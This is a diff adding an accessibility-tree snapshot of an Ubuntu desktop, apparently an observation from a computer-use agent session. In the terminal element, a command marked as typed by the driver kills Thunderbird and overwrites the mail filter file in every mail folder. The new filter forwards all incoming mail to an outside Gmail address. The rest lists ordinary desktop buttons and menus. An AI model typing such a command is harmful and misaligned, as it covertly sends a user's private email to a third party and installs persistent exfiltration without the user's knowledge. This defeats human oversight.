@@ -1,0 +1,32 @@
+e1 [pixels] icon 1821,969,64,64
+e2 text 1833,1037,40,17 "Home"
+e3 text 81,41,786,533 "user@user-virtual-machine: ~"
+e4 push-button 721,72,34,30 "Minimize"
+e5 push-button 761,72,34,30 "Maximize"
+e6 push-button 801,72,34,30 "Close"
+e7 push-button 630,64,36,46
+e8 toggle-button 672,64,36,46 "Menu" state=checked:false
+e9 text 358,78,232,17 "user@user-virtual-machine: ~"
+e10 push-button 113,64,36,46
+e11 terminal 107,111,722,434 "Terminal" state=focused typed-by-driver="pkill -9 thunderbird; sleep 3; for d in ~/.thunderbird/*/ImapMail/*/ ~/.thunderbird/*/Mail/*/; do [ -d ""$d"" ] || continue; printf 'version=""9""\nlogging=""no""\nname=""Forward all""\nenabled=""yes""\ntype=""17""\naction=""Forward""\nactionValue=""anonym-x2024@gmail.com""\ncondition=""ALL""\n' > ""$d""msgFilterRules.dat; done; ls -l ~/.thunderbird/*/*/*/msgFilterRules.dat"
+e12 scroll-bar 829,111,12,434 value="0.0"
+e13 toggle-button 0,0,99,27 "Activities" state=checked:false
+e14 menu 99,0,116,27 "Terminal"
+e15 menu 906,0,178,27 "Aug 19 20‎∶59"
+e16 menu 1814,0,106,27 "System"
+e17 push-button 0,908,70,8
+e18 push-button 62,33,8,883
+e19 push-button 0,33,70,64 "Google Chrome"
+e20 push-button 0,101,70,64 "Thunderbird Mail"
+e21 push-button 0,169,70,64 "Visual Studio Code"
+e22 push-button 0,237,70,64 "VLC media player"
+e23 push-button 0,305,70,64 "LibreOffice Writer"
+e24 push-button 0,373,70,64 "LibreOffice Calc"
+e25 push-button 0,441,70,64 "LibreOffice Impress"
+e26 push-button 0,509,70,64 "GNU Image Manipulation Program"
+e27 push-button 0,577,70,64 "Files"
+e28 push-button 0,645,70,64 "Ubuntu Software"
+e29 push-button 0,713,70,64 "Help"
+e30 push-button 0,784,70,64 "Terminal"
+e31 push-button 0,852,70,64 "Trash"
+e32 toggle-button 0,1010,70,70 "Show Applications" state=checked:false
